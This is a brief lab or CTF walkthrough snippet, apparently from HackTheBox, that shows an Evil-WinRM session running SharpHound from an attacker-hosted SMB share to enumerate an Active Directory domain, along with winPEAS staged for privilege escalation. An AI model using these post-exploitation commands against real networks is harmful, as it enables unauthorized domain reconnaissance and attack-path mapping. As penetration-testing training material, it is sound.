# Using sharphound to collect data from domain controllers and domain-joined Windows systems
```powershell
*Evil-WinRM* PS clark:\> ls


    Directory: \\10.10.14.105\clarkey


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/27/2021   5:21 AM         833024 SharpHound.exe
-a----        7/27/2021   4:08 AM         441856 winPEASany.exe


*Evil-WinRM* PS clark:\> .\SharpHound.exe -c all
-----------------------------------------------
Initializing SharpHound at 5:39 AM on 7/27/2021
-----------------------------------------------

Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container

[+] Creating Schema map for domain HTB.LOCAL using path CN=Schema,CN=Configuration,DC=htb,DC=local
[+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 21 MB RAM
Status: 123 objects finished (+123 8.785714)/s -- Using 28 MB RAM
Enumeration finished in 00:00:14.8389289
Compressing data to .\20210727053947_BloodHound.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 5:40 AM on 7/27/2021! Happy Graphing!

*Evil-WinRM* PS clark:\> ls


    Directory: \\10.10.14.105\clarkey


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/27/2021   5:33 AM          15219 20210727053947_BloodHound.zip
-a----        7/27/2021   5:33 AM          23611 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
-a----        7/27/2021   5:21 AM         833024 SharpHound.exe
-a----        7/27/2021   4:08 AM         441856 winPEASany.exe


*Evil-WinRM* PS clark:\>
```
